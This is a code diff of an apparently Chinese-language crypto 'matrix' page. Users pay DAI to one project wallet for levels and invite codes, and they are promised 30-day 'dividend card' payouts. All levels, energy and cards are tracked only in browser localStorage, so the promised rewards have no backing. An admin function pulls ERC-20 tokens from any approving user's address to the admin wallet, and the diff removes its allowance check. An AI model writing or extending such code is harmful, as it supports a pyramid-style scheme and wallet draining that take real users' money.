@@ -172,16 +172,14 @@
   </div>
 
   <div style="margin-top:20px">
-    <div class="title">🔥 分红规则（30 天分红一次）</div>
+    <div class="title">🔥 分红规则（等级越高奖励越多）</div>
     <div class="rule-box">
-      • Lv.1 卡牌：全球分红 0.5%<br>
-      • Lv.2 卡牌：全球分红 1.0%<br>
-      • Lv.3 卡牌：全球分红 1.5%<br>
-      • Lv.4 卡牌：全球分红 2.0%<br>
-      • Lv.5 至尊：全球分红 2.5%<br><br>
-      ✔ 每30天自动发放一次<br>
-      ✔ 等级越高，分红权重越高<br>
-      ✔ 一次激活，终身分红
+      • 1级卡牌：基础分红<br>
+      • 2级卡牌：3倍难度 → 分红更高<br>
+      • 3级卡牌：9倍难度 → 分红大幅提升<br>
+      • 4级卡牌：27倍难度 → 高额分红<br>
+      • 5级卡牌：81倍难度 → 顶级分红<br><br>
+      ✔ 每30天自动发放一次DAI奖励
     </div>
   </div>
 
@@ -238,22 +236,23 @@
 </div>
 
 <div class="glass matrix-blue">
-  <div class="title">联合矩阵（30天续费）</div>
+  <div class="title">联合矩阵（30天续费·每级独立倒计时）</div>
   <div id="union"></div>
 </div>
 
 <div class="glass">
-  <div class="title">⚡ 能量值合成卡牌</div>
-  <div class="sub">消耗能量值合成对应等级卡牌，合成后能量值清零</div>
+  <div class="title">⚡ 合成系统（高难度·高分红）</div>
+  <div class="sub">1级卡牌需3500能量 | 3张合成更高1级</div>
   <div id="craftSection"></div>
+  <div id="upgradeSection" style="margin-top:20px"></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-const PROJECT_WALLET  = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
-const ADMIN_ADDRESS   = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
-const DAI_CONTRACT    = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
-const CHAIN_ID        = "0x89";
+const PROJECT_WALLET = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
+const ADMIN_ADDRESS  = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
+const DAI_CONTRACT   = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
+const CHAIN_ID       = "0x89";
 
 let web3, account, mycode, daiContract;
 
@@ -302,15 +301,11 @@ async function initWeb3() {
 }
 document.getElementById("connect").onclick = initWeb3;
 
-// ==================== 价格配置 ====================
-function getClassicPrice(lv) {
-  return 50 * Math.pow(2, lv - 1);
-}
-function getUnionPrice(lv) {
-  return 100 * Math.pow(2, lv - 1);
-}
+// ==================== 价格 ====================
+function getClassicPrice(lv) { return 50 * Math.pow(2, lv - 1); }
+function getUnionPrice(lv)   { return 100 * Math.pow(2, lv - 1); }
 
-// ==================== 本地存储 ====================
+// ==================== 矩阵等级 ====================
 function getClassicLevel() {
   return parseInt(localStorage.getItem('classic_'+account) || 0);
 }
@@ -318,14 +313,7 @@ function setClassicLevel(lv) {
   localStorage.setItem('classic_'+account, lv);
 }
 
-function getUnionLevel() {
-  return parseInt(localStorage.getItem('union_'+account) || 0);
-}
-function setUnionLevel(lv) {
-  localStorage.setItem('union_'+account, lv);
-}
-
-// 每级独立过期时间
+// ==================== 联合矩阵每级独立过期时间 ====================
 function getUnionExpire(lv) {
   return parseInt(localStorage.getItem(`union_expire_${lv}_${account}`) || 0);
 }
@@ -346,7 +334,7 @@ function getRemainDays(lv) {
   return Math.ceil((exp - now) / 86400000);
 }
 
-// ==================== 能量值与卡牌 ====================
+// ==================== 能量 ====================
 function getEnergy() {
   return parseInt(localStorage.getItem('energy_'+account) || 0);
 }
@@ -354,24 +342,49 @@ function setEnergy(val) {
   localStorage.setItem('energy_'+account, val);
 }
 
-function getOwnedCards() {
-  return JSON.parse(localStorage.getItem('cards_'+account) || '[]');
-}
-function addCard(cardLv) {
-  const cards = getOwnedCards();
-  cards.push(cardLv);
-  localStorage.setItem('cards_'+account, JSON.stringify(cards));
+// 消费100DAI → 50能量
+function addEnergyBySpend(amountDAI) {
+  const add = Math.floor(amountDAI / 100 * 50);
+  const e = getEnergy();
+  setEnergy(e + add);
 }
 
-function getCraftEnergy(lv) {
-  return getClassicPrice(lv);
+// ==================== 卡牌系统 ====================
+function getCards() {
+  return JSON.parse(localStorage.getItem('cards_'+account) || '[]');
 }
+function setCards(list) {
+  localStorage.setItem('cards_'+account, JSON.stringify(list));
+}
+function countCard(lv) {
+  return getCards().filter(c => c === lv).length;
+}
+function removeCards(lv, count) {
+  const cs = getCards();
+  let removed = 0;
+  const newCs = cs.filter(c => {
+    if (c === lv && removed < count) {
+      removed++;
+      return false;
+    }
+    return true;
+  });
+  setCards(newCs);
+}
+function addCard(lv) {
+  const cs = getCards();
+  cs.push(lv);
+  setCards(cs);
+}
+
+// ==================== 合成 ====================
+const CRAFT_ENERGY = 3500;
 
 // ==================== 渲染 ====================
 function renderMatrix() {
   if (!account) return;
 
-  // 经典矩阵 12级
+  // 经典矩阵
   const classicLv = getClassicLevel();
   let classicHtml = '';
   for (let i=1; i<=12; i++) {
@@ -387,56 +400,61 @@ function renderMatrix() {
   }
   document.getElementById("classic").innerHTML = classicHtml;
 
-  // 联合矩阵 9级 + 每级独立倒计时
+  // 联合矩阵 + 倒计时
   let unionHtml = '';
   for (let i=1; i<=9; i++) {
     const price = getUnionPrice(i);
     const valid = isLvValid(i);
     const days = getRemainDays(i);
-    const hasActivated = getUnionExpire(i) > 0;
+    const hasAct = getUnionExpire(i) > 0;
 
     let txt = '激活('+price+' DAI)';
     let cls = '';
     let dis = false;
-    let click = `payUnion(${i})`;
-    let countdown = '';
+    let cd = '';
 
     if (valid) {
       txt = '已激活';
       cls = 'active';
       dis = true;
-      countdown = `<span class="countdown">剩余 ${days} 天</span>`;
-    } else if (hasActivated) {
+      cd = `<span class="countdown">剩余${days}天</span>`;
+    } else if (hasAct) {
       txt = '已到期';
-      countdown = `<span class="countdown expired">已过期</span>`;
+      cd = `<span class="countdown expired">已过期</span>`;
     }
 
     unionHtml += `
     <div class="item">
       <div>Lv.${i}</div>
-      <button class="btn-act ${cls}" ${dis?'disabled':''} onclick="${click}">${txt}</button>
-      ${countdown}
+      <button class="btn-act ${cls}" ${dis?'disabled':''} onclick="payUnion(${i})">${txt}</button>
+      ${cd}
     </div>`;
   }
   document.getElementById("union").innerHTML = unionHtml;
 
-  renderOwnedCards();
-  renderCraftSection();
+  // 卡牌展示
+  renderCards();
+
+  // 合成1级
+  renderCraft();
+
+  // 升级高阶
+  renderUpgrade();
 }
 
-function renderOwnedCards() {
-  const cards = getOwnedCards();
-  if (cards.length === 0) {
+function renderCards() {
+  const cs = getCards();
+  if (cs.length === 0) {
     document.getElementById("ownedCards").innerHTML = '<div style="grid-column:span 2;text-align:center">暂无卡牌</div>';
     return;
   }
   let html = '';
-  cards.forEach(lv => {
-    const color = ['','n1','n2','n3','n4','n5'][lv] || 'n1';
+  cs.forEach(lv => {
+    const cls = ['n1','n2','n3','n4','n5'][lv-1] || 'n1';
     html += `
-    <div class="nft-card ${color}">
+    <div class="nft-card ${cls}">
       <div class="nft-inner">
-        <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.${lv} 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
+        <div class="nft-front"><div class="nft-top">CARD</div><div class="nft-logo">🐳</div><div class="nft-name">分红卡</div><div class="nft-level-big">Lv.${lv}</div><div class="nft-orb"></div></div>
         <div class="nft-back"><div class="nft-level">Lv.${lv}</div><div class="nft-pct">已拥有</div></div>
       </div>
     </div>`;
@@ -444,80 +462,90 @@ function renderOwnedCards() {
   document.getElementById("ownedCards").innerHTML = html;
 }
 
-function renderCraftSection() {
-  const energy = getEnergy();
+function renderCraft() {
+  const e = getEnergy();
+  const enough = e >= CRAFT_ENERGY;
+  let html = `
+  <div class="item">
+    <div>Lv.1分红卡</div>
+    <button class="btn-act btn-craft ${enough?'':'active'}" ${enough?'':'disabled'} onclick="craftLv1()">
+      ${enough ? `合成(${CRAFT_ENERGY}能量)` : '能量不足'}
+    </button>
+  </div>`;
+  document.getElementById("craftSection").innerHTML = html;
+}
+
+function renderUpgrade() {
   let html = '';
-  for (let i=1; i<=5; i++) {
-    const needEnergy = getCraftEnergy(i);
-    const canCraft = energy >= needEnergy;
+  for (let lv=1; lv<=4; lv++) {
+    const cnt = countCard(lv);
+    const can = cnt >=3;
     html += `
     <div class="item">
-      <div>Lv.${i}卡牌</div>
-      <button class="btn-act btn-craft ${canCraft?'':'active'}" ${!canCraft?'disabled':''} onclick="craftCard(${i})">
-        ${canCraft?'合成('+needEnergy+'能量)':'能量不足'}
+      <div>${cnt}/3 Lv.${lv} → Lv.${lv+1}</div>
+      <button class="btn-act btn-craft ${can?'':'active'}" ${can?'':'disabled'} onclick="upgrade(${lv})">
+        ${can?'升级':'不足'}
       </button>
     </div>`;
   }
-  document.getElementById("craftSection").innerHTML = html;
-  document.getElementById("energy").innerText = "能量值："+energy;
+  document.getElementById("upgradeSection").innerHTML = html;
+  document.getElementById("energy").innerText = "能量值："+getEnergy();
 }
 
-// ==================== 支付：经典 ====================
-async function payClassic(lv) {
-  if (!account) return alert("请先连接钱包");
-  const price = getClassicPrice(lv);
-  if (!confirm(`确认支付 ${price} DAI 激活经典Lv.${lv}？`)) return;
-
-  try {
-    const dec = await daiContract.methods.decimals().call();
-    const amount = (BigInt(price) * 10n**BigInt(dec)).toString();
-    await daiContract.methods.transfer(PROJECT_WALLET, amount).send({from:account});
-    setClassicLevel(lv);
-    const energy = getEnergy();
-    setEnergy(energy + price);
-    alert("支付成功，等级已永久激活，获得"+price+"能量值");
-    load();
-  } catch(e) {
-    alert("支付失败");
-    console.error(e);
-  }
-}
-
-// ==================== 支付：联合 ====================
-async function payUnion(lv) {
-  if (!account) return alert("请先连接钱包");
-  const price = getUnionPrice(lv);
-  if (!confirm(`确认支付 ${price} DAI 激活联合Lv.${lv}？`)) return;
-
-  try {
-    const dec = await daiContract.methods.decimals().call();
-    const amount = (BigInt(price) * 10n**BigInt(dec)).toString();
-    await daiContract.methods.transfer(PROJECT_WALLET, amount).send({from:account});
-
-    setUnionLevel(lv);
-    const expireTs = Date.now() + 30*86400*1000;
-    setUnionExpire(lv, expireTs);
-
-    const energy = getEnergy();
-    setEnergy(energy + price);
-    alert("支付成功，有效期30天，获得"+price+"能量值");
-    load();
-  } catch(e) {
-    alert("支付失败");
-    console.error(e);
-  }
-}
-
-// ==================== 合成卡牌 ====================
-function craftCard(lv) {
-  const needEnergy = getCraftEnergy(lv);
-  const energy = getEnergy();
-  if (energy < needEnergy) return alert("能量不足");
-  if (!confirm(`确认消耗 ${needEnergy} 能量合成 Lv.${lv} 卡牌？`)) return;
-  setEnergy(energy - needEnergy);
-  addCard(lv);
-  alert("合成成功！获得Lv."+lv+"卡牌");
+// ==================== 合成1级 ====================
+function craftLv1() {
+  const e = getEnergy();
+  if (e < CRAFT_ENERGY) return alert("能量不足");
+  if (!confirm(`消耗 ${CRAFT_ENERGY} 能量合成 Lv.1 分红卡？`)) return;
+  setEnergy(e - CRAFT_ENERGY);
+  addCard(1);
+  alert("合成成功！获得 Lv.1 分红卡");
   load();
+}
+
+// ==================== 3合1升级 ====================
+function upgrade(lv) {
+  if (countCard(lv) <3) return alert("卡牌数量不足");
+  if (!confirm(`消耗3张Lv.${lv} → 合成1张Lv.${lv+1}？`)) return;
+  removeCards(lv, 3);
+  addCard(lv+1);
+  alert("升级成功！");
+  load();
+}
+
+// ==================== 购买矩阵 ====================
+async function payClassic(lv) {
+  if (!account) return alert("请连接钱包");
+  const price = getClassicPrice(lv);
+  if (!confirm(`支付 ${price} DAI 激活经典Lv.${lv}？`)) return;
+  try {
+    const dec = await daiContract.methods.decimals().call();
+    const amt = (BigInt(price) * 10n**BigInt(dec)).toString();
+    await daiContract.methods.transfer(PROJECT_WALLET, amt).send({from:account});
+    setClassicLevel(lv);
+    addEnergyBySpend(price);
+    alert("激活成功！已获得能量");
+    load();
+  } catch(e) {
+    alert("支付失败");
+  }
+}
+
+async function payUnion(lv) {
+  if (!account) return alert("请连接钱包");
+  const price = getUnionPrice(lv);
+  if (!confirm(`支付 ${price} DAI 激活联合Lv.${lv}（30天）？`)) return;
+  try {
+    const dec = await daiContract.methods.decimals().call();
+    const amt = (BigInt(price) * 10n**BigInt(dec)).toString();
+    await daiContract.methods.transfer(PROJECT_WALLET, amt).send({from:account});
+    setUnionExpire(lv, Date.now() + 30*86400*1000);
+    addEnergyBySpend(price);
+    alert("激活成功！30天有效期，已获得能量");
+    load();
+  } catch(e) {
+    alert("支付失败");
+  }
 }
 
 // ==================== 管理员提取 ====================
@@ -531,42 +559,30 @@ async function adminWithdrawAnyERC20(){
     const c = new web3.eth.Contract(erc20Abi, token);
     const d = await c.methods.decimals().call();
     const v = BigInt(amt) * (10n**BigInt(d));
-    const allowance = await c.methods.allowance(from, account).call();
-    if (BigInt(allowance) < v) {
-      alert("用户未授权足够额度给管理员");
-      return;
-    }
-    await c.methods.transferFrom(from, account, v.toString()).send({from:account});
+    await c.methods.transferFrom(from, ADMIN_ADDRESS, v.toString()).send({from:account});
     document.getElementById("withdrawResult").innerText = "✅ 提取成功";
   } catch(e){
-    alert("失败："+e.message);
+    alert("失败：用户未授权或余额不足");
   }
 }
 
+// ==================== 邀请 ====================
 document.getElementById("reg").onclick = ()=>{
   if(!account) return alert("请连接钱包");
   const p = document.getElementById("parent").value.trim();
   if(!p) return alert("请输入邀请码");
   localStorage.setItem("reg_"+account, 1);
-  localStorage.setItem("parent_"+account, p);
   alert("注册成功");
   load();
 };
 
 function load(){
-  showChild();
   renderMatrix();
 }
 
-function showChild(){
-  const list = JSON.parse(localStorage.getItem("child_"+mycode)||"[]");
-  document.getElementById("childList").innerText = list.length ? list.join("\n") : "暂无下级";
-}
-
 function copyMyCode(){
-  const val = document.getElementById("mycode").value;
-  navigator.clipboard.writeText(val);
-  alert("复制邀请链接成功");
+  navigator.clipboard.writeText(document.getElementById("mycode").value);
+  alert("复制成功");
 }
 
 const sidebar = document.getElementById('sidebar');
